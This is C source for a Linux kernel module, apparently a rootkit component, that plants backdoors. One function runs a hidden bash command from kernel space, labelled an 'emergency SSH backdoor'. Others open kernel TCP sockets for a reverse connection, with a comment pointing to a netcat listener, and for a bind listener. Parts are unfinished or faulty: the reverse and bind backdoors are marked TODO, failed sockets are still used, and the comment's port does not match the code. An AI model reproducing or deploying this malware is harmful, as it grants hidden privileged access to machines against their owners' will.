#include "backdoor.h"

#include <linux/types.h>
#include <linux/net.h>
#include <linux/skbuff.h>
#include <linux/un.h>
#include <linux/unistd.h>
#include <linux/wait.h>
#include <linux/ctype.h>
#include <linux/unistd.h>
#include <asm/unistd.h>
#include <linux/inet.h>
#include <net/ip.h>
#include <net/sock.h>
#include <net/tcp.h>

#include <linux/version.h>

static void backdoor_ssh(void) {

    char *argv[] = { "/bin/bash", "-c", BCK_SSH, NULL };
    char *envp[] = { "HOME=/", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static int rk_sendbuff(struct socket *sock, const char *buffer, int length)
{
    struct msghdr msg;
    mm_segment_t oldfs;
    struct iovec iov;
    int len;

    iov.iov_base = (char*) buffer; 
    iov.iov_len = (__kernel_size_t) length;

    msg.msg_flags = MSG_NOSIGNAL;

    #if LINUX_VERSION_CODE < KERNEL_VERSION(3,19,0)
       msg.msg_iov = &iov;
       msg.msg_iovlen = 1;
    #else
      iov_iter_init(&msg.msg_iter, WRITE, &iov, 1, 1);
    #endif
    #if LINUX_VERSION_CODE < KERNEL_VERSION(4,1,0)
        len = sock_sendmsg(sock,&msg,length);
    #else
        len = sock_sendmsg(sock, &msg);
    #endif

    return len;
}


static int rk_recvbuff(struct socket *sock, const char *buffer, int length)
{
    struct msghdr msg;
    struct iovec iov;
    int len;
    mm_segment_t oldfs;

    iov.iov_base = (char*) buffer;
    iov.iov_len = (__kernel_size_t) length;

    #if LINUX_VERSION_CODE < KERNEL_VERSION(3,19,0)
       msg.msg_iov = &iov;
       msg.msg_iovlen = 1;
    #else
      iov_iter_init(&msg.msg_iter, WRITE, &iov, 1, 1);
    #endif

    /* Recieve the message */
    oldfs = get_fs(); set_fs(KERNEL_DS);
    len = sock_recvmsg(sock,&msg,length,0/*MSG_DONTWAIT*/);
    set_fs(oldfs);

    if ((len!=-EAGAIN)&&(len!=0))
        printk("Recvbuffer Recieved %i bytes \n",len);

    return len;
}

static void backdoor_reverse(void) {

    /* client bind with : nc -lvp 4242 */

    struct socket *sock;
    struct sockaddr_in sin;
    int error;
    char *buff = NULL;

    error = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
    if (error < 0) {
        printk("Error during creation of socket; terminating\n");
    }

    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = in_aton("127.0.0.1");
    sin.sin_port = htons(2424);

    error = sock->ops->connect(sock, (struct sockaddr*) &sin, sizeof(sin), !O_NONBLOCK);
    if (error < 0) {
        printk("Error during connection of socket; terminating\n");
        sock_release(sock);
    }
    
    buff = kmalloc(1024, GFP_KERNEL);
    if (buff == NULL)
    {
        printk("No mem\n");
        sock_release(sock);
    }
    strcpy(buff, "Hello World\n");

    rk_sendbuff(sock, buff, 1024);

    sock_release(sock);
    kfree(buff);
}

static void backdoor_bind(void) {

    /* client connect with : nc 127.0.0.1 4243 */

    struct socket *sock;
    struct sockaddr_in sin;
    int error;
    int sysctl_ktcpvs_max_backlog = 2048;

    /* First create a socket */
    error = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
    if (error < 0) {
        printk("Error during creation of socket; terminating\n");
    }

    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = in_aton("127.0.0.1");
    sin.sin_port = htons(4243);

    error = sock->ops->bind(sock, (struct sockaddr *) &sin, sizeof(sin));
    if (error < 0) {
        printk("Error binding socket. This means that some "
         "other daemon is (or was a short time ago) "
         "using");
        sock_release(sock);
    }

    /* Now, start listening on the socket */
    error = sock->ops->listen(sock, sysctl_ktcpvs_max_backlog);
    if (error != 0) {
        printk("ktcpvs: Error listening on socket \n");
        sock_release(sock);
    }

    // struct socket * newsock;
    // newsock->type = sock->type;
    // newsock->ops=sock->ops;
    // newsock->ops->accept(sock,newsock,0);


    sock_release(sock);    

}

void backdoor(void) {

    /* EMERGENCY SSH BACKDOOR */
    if (ALLOW_SSH == 1) {
        backdoor_ssh();
    }

    /* TODO REVERSE BACKDOOR */
    backdoor_reverse();

    /* TODO ACTIVATOR BACKDOOR */
    // caution don't, please don't
    //backdoor_bind();
}